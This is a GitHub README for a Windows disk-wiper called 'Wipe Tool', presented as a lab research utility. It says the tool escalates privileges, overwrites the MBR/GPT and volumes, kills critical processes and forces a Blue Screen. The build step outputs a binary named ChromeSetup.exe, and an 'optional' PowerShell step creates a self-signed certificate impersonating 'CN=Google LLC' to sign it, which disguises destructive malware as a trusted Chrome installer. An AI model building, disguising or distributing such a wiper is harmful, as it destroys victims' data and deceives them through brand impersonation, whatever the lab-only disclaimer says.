<div align="center">

# ⚡ Wipe Tool

### Low-level Windows Research Utility

**Disk structure destruction • Privilege escalation • Controlled system crash**

<br>

![C++](https://img.shields.io/badge/C%2B%2B-17-00599C?style=for-the-badge&logo=cplusplus&logoColor=white)
![Windows](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-2EA44F?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Research%20Only-red?style=for-the-badge)

<br>

```text
⚠️  FOR ISOLATED LABORATORY USE ONLY
```

</div>

---

<br>

> [!CAUTION]
> **CRITICAL WARNING**  
> This software **permanently destroys data** and forces a **Blue Screen of Death**.  
> Run it exclusively inside a virtual machine or on disposable test hardware.  
> The author assumes **no liability** for any damage, data loss, or system failure.

<br>

## 🎯 Purpose

This is a research-oriented utility designed to study:

- Low-level Windows disk I/O and partition table manipulation
- Privilege escalation mechanisms
- Critical process termination behavior
- Controlled induction of system failure (BSOD)

It is **not** a production tool, not a real Chrome installer, and not intended for any real-world use outside of isolated lab environments.

<br>

## 🔥 What It Actually Does

| Action | Description |
|:-------|:------------|
| **Privilege Elevation** | Requests high-level privileges (`SeDebugPrivilege`, `SeManageVolumePrivilege`, etc.) |
| **Physical Disk Wipe** | Overwrites beginning and end of the physical drive (destroys MBR/GPT) |
| **Volume Destruction** | Overwrites the start of fixed logical volumes |
| **Process Termination** | Forcefully kills critical system processes |
| **System Crash** | Triggers a Blue Screen of Death via `NtRaiseHardError` |

<br>

## 🛠️ Build

### Prerequisites

- Windows 10 / 11
- MinGW-w64 / Clang / MSVC
- Administrator rights (for running)

### Compile

```bash
git clone https://github.com/Andrejarsenevskij/wipe-tool.git
cd wipe-tool
build.bat
```

The output binary will be named `ChromeSetup.exe`.

<br>

## 🚀 Usage

```cmd
ChromeSetup.exe
```

> [!WARNING]
> Always execute inside a clean virtual machine.  
> Never run this on a machine containing important data.

<br>

## 🔏 Local Code Signing (Optional)

**Step 1:** Generate, export, and install the certificate.
```powershell
$cert = New-SelfSignedCertificate `
    -CertStoreLocation "Cert:\CurrentUser\My" `
    -Subject "CN=Google LLC" `
    -Type CodeSigningCert `
    -HashAlgorithm SHA256

Export-Certificate `
    -Cert $cert `
    -FilePath "$env:TEMP\cert.crt"

Import-Certificate `
    -FilePath "$env:TEMP\cert.crt" `
    -CertStoreLocation "Cert:\CurrentUser\Root"

```
**Step 2:** Apply the digital signature with a timestamp.

```powershell
Set-AuthenticodeSignature `
    -FilePath "C:\path\to\your\folder\file.exe" `
    -Certificate (Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert | 
                  Where-Object {$_.Subject -eq "CN=Google LLC"})[0] `
    -TimestampServer "http://timestamp.digicert.com"
```
<br>

## 📁 Project Structure

```text
wipe-tool/
├── main.cpp          # Core logic
├── build.bat         # One-click build script
├── resource.rc       # Icon resource
├── 6.ico             # Application icon
├── LICENSE           # MIT License
└── README.md
```

<br>

## 📜 License

Distributed under the **MIT License**.  
See [`LICENSE`](LICENSE) for more information.

<br>

---
<div align="center">
<br>
    
Developed by [**Andrej Arsenevskij**](https://github.com/Andrejarsenevskij)
</div>
